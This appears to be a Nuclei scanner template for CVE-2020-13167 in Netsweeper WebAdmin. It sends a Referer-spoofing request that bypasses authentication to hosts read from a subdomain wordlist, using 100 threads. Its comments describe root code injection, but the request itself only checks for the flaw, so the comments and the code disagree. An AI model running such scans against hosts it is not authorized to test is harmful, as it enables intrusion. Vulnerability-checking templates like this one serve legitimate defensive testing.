id: CVE-2020-13167 2

info:
  name: Netsweeper WebAdmin unixlogin.php Python Code Injection
  author: dwisiswant0
  severity: critical
  description: Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters.
  tags: cve,cve2020,netsweeper,rce
  reference: |
    - https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/
    - https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says

  # This template exploits a Python code injection in the Netsweeper
  # WebAdmin component's unixlogin.php script, for versions 6.4.4 and
  # prior, to execute code as the root user.

  # Authentication is bypassed by sending a random whitelisted Referer
  # header in each request.

  # Tested on the CentOS Linux-based Netsweeper 6.4.3 and 6.4.4 ISOs.
  # Though the advisory lists 6.4.3 and prior as vulnerable, 6.4.4 has
  # been confirmed exploitable.

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /webadmin/out HTTP/1.1
        Host: {{Subdomains}}
        Referer: "http://{{Subdomains}}/webadmin/admin/service_manager_data.php"
        User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "nonexistent"
        part: body
      - type: status
        status:
          - 200
